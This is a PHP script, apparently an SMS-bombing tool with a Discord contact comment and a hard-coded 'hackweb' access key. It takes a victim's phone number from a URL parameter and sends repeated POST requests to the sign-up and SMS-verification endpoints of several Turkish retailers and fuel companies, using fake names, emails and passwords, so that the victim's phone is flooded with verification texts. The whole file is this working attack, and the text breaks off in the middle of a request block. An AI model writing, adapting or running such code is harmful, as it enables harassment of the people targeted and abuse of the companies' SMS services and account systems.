<?php
//Discord: Ekarvo#3754 Ulaşabilirsiniz
header("Content-Type: application/json; utf-8;");
error_reporting(0);
 
$auth_keys = ["hackweb"];
 
$auth = $_GET['auth'] ?? null;
 
if (!in_array($auth, $auth_keys)) {
 http_response_code(401);
 exit("Girdiğiniz auth yanlış ya da auth girmediniz");
 }
 
if(isset($_GET['telno']))
{
 
        $telno=$_GET['telno'];
 
if (empty($telno)) {
header('HTTP/1.1 400 Bad Request');
echo json_encode([
'error' => 'bir telefon numarasi girmelisin'
]);
exit;
}
 

$ch = curl_init();
 

 
 
curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

